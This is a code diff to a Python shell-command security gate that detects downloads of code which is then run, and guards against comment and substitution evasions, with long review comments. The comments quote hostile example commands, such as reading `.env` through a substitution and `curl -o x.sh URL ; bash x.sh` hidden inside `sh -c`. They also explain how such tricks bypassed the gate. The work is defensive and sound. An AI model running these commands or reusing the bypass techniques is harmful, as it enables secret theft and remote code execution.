@@ -968,15 +968,30 @@ def _subst_inners(seg):
     """
     seg = seg[:_SUBST_MAXLEN]     # bound the WHOLE walk (openers AND the paren
     out, i, n, quote = [], 0, len(seg), None   # balance) to a fixed prefix, so
+    wstart = True                 # `#` opens a comment only at a WORD START
+    # [B5 review] A heredoc BODY is not shell code: inside an UNQUOTED `<<EOF`
+    # body a line-leading `#` is ordinary text and bash STILL expands `$(...)`.
+    # Reading it as a comment invents one and drops a live substitution, so the
+    # `#` rule is off for any command carrying a heredoc opener (backlog X-42).
+    # `<<<` is a herestring - one word, no body - and is removed before the
+    # test rather than tripping it. Shell parity: `_hd` in _cs_subst_scan,
+    # computed there on the same already-truncated string.
+    heredoc = "<<" in seg.replace("<<<", "")
     while i < n:                  # the shell twin's O(n^2) walk cannot time out
         ch = seg[i]              # while this O(n) one completes (parity by cap)
         if ch == "\\\\" and i + 1 < n and quote != "'":
+            # A backslash-NEWLINE pair is a LINE CONTINUATION - bash deletes it,
+            # so the word-start state before it survives it. Clearing wstart
+            # here lifted an install out of a comment on the next line.
+            if seg[i + 1] != "\\n":
+                wstart = False
             i += 2                       # escaped char: skip it and its target
             continue
         if quote == "'":
             if ch == "'":
                 quote = None
             i += 1
+            wstart = False
             continue
         if quote != '"':
             # Outside double quotes an unquoted `$(...)` / backtick is already
@@ -985,11 +1000,44 @@ def _subst_inners(seg):
             # hidden inside double quotes. A bare sub at command position that
             # RUNS its own output is Class B, handled by the download-then-run
             # rule, not here.
+            # [B5] An unquoted `#` that BEGINS a word opens a comment, and bash
+            # executes NOTHING in it. This walk runs BEFORE the trailing-comment
+            # strip (`seg.split(" #", 1)[0]` in _scan_install_line, the shell's
+            # `${_seg%% \\#*}`), so a verb inside a double-quoted substitution in
+            # a comment was lifted and matched: `git status  # ...
+            # "$(git push origin main)"` was DENIED by ci-mirror, which RUNS
+            # commands.ci_local first and has no override path. Skip to the
+            # newline, do NOT stop the walk - a comment ends at end-of-LINE and
+            # a multi-line command keeps executing, so breaking out here would
+            # drop the following lines' substitutions (the fail-open direction).
+            # `#` mid-word is literal (`echo a#b`), and a word survives an
+            # ESCAPED blank (`echo a\\ #b` is the single word `a #b`), which is
+            # why word-start is carried as state and not read off seg[i - 1].
+            if ch == "#" and wstart and not heredoc:
+                nl = seg.find("\\n", i)
+                if nl < 0:
+                    break
+                i = nl + 1
+                wstart = True
+                continue
             if ch in ("'", '"'):
                 quote = ch
+                wstart = False
+            # [B5 review] `(` and `)` are NOT in this set, and the shell twin's
+            # is spelled the same way. Every member here terminates a word
+            # unconditionally; `)` does not - the one closing `$(...)`,
+            # `$((...))` or `<(...)` belongs to the current word, so
+            # `echo $(true)#"$(cat .env)"` really does read the secret. Calling
+            # it a word start invented a comment and dropped the rest of the
+            # line on both substrates. Over-lifting is the fail-closed side.
+            elif ch in " \\t\\n;&|":
+                wstart = True
+            else:
+                wstart = False
             i += 1
             continue
         # inside "...": a ' is a literal char, but $( and ` are still active
+        wstart = False
         if ch == '"':
             quote = None
             i += 1
@@ -1183,7 +1231,7 @@ def _segment_candidates(cmd, _depth=0):
         if not any(c.isspace() for c in tok):
             continue
         if _depth < _EXPAND_DEPTH:
-            for inner in _shell_segments(tok):
+            for inner in _lift_subs(tok):
                 out.extend(_segment_candidates(inner, _depth + 1))
         else:
             out.extend(w for w in tok.split() if w)
@@ -1807,7 +1855,47 @@ def _download_then_run(cmd):
     # The pipe walk has parked these since an earlier repair; this pass never
     # did. Shell parity (`_D20CMD`).
     cmd = cmd.replace("&>", "> ").replace(">&", "> ")
-    written, segs = set(), _shell_segments(cmd, _CMD_OPS)
+    # [item 1 review, B2] `_lift_subs`, NOT `_shell_segments`. This was the one
+    # whole-command segmentation driver in this module the item-1 change did not
+    # convert, and its SHELL twin walks `cmd_segments "$_D20CMD"` (templates.py
+    # :4160 write pass, :4421 run pass), which gained the `_cs_subst_scan` seed.
+    # So the shell's D20 download-then-run correlation learned to see inside a
+    # `$(...)` and this one stayed blind: `echo "$(curl -o x.sh URL)" ; bash
+    # x.sh` was shell-deny / SDK-ALLOW - the direction this module's own binding
+    # rule forbids - on payloads that were allow/allow before item 1. Every half
+    # of the correlation can be hidden that way (the downloader, the
+    # interpreter, the redirect target, or both halves in separate
+    # substitutions), and `_cmd_word('"$(curl')` is not `curl`, so the write set
+    # stayed empty and this function returned False. Round-4 D8 is exactly this
+    # shape: the fix landing in the copies the gate does not use.
+    #
+    # [item 1 review, B2 round 2] `_expand_invoker_args`, and FLATTENED.
+    #
+    # `_lift_subs` alone is NOT the twin of `cmd_segments`. `cmd_segments` does
+    # two things - the `_cs_subst_scan` seed AND a depth-bounded drain that
+    # re-applies the invoker rule at every level - and `_lift_subs` only does
+    # the first. Without the invoker arm a substitution that is invisible in the
+    # raw command because it sits inside an invoker's SINGLE-quoted argument is
+    # never lifted, and `sh -c 'echo "$(curl -o x.sh URL)"' ; bash x.sh` stayed
+    # shell-deny / SDK-ALLOW - execution-proven RCE, the forbidden direction.
+    # `_scan_install_line`, this function's only caller, already spells it this
+    # way eleven lines below.
+    #
+    # FLATTEN, because the two substrates were handing their run scans the same
+    # segment in DIFFERENT SPELLINGS. `cmd_segments` glues a quoted run into one
+    # word with the `_CS_WS` sentinel; `_shell_segments` defaults to
+    # `flatten=False` and keeps real spaces. That mismatch was inert while the
+    # write set was empty, and lifting made it reachable: the lifted downloader
+    # puts its own `-o` target into `written`, the run pass then re-scans the
+    # OUTER segment, whose whitespace split still contains that file name as a
+    # bare token, and matches it as a file this command RUNS. A SELF-match
+    # against the download's own argument - `HTTP="$(curl -o /dev/null -s -w
+    # '%{http_code}' URL)"` denied with no interpreter anywhere in the command.
+    # Flattening restores the shell's spelling, so a quoted run is one token
+    # here exactly as it is there.
+    written = set()
+    segs = [_flatten_seg(_s)
+            for _s in _expand_invoker_args(_lift_subs(cmd, _CMD_OPS))]
     # [round-5 P3] THE POST-DOWNLOAD PIPE STAGES, CAPTURED UNCONDITIONALLY.
     #
     # The X-32 write capture that makes a file "fetched-derived" used to run
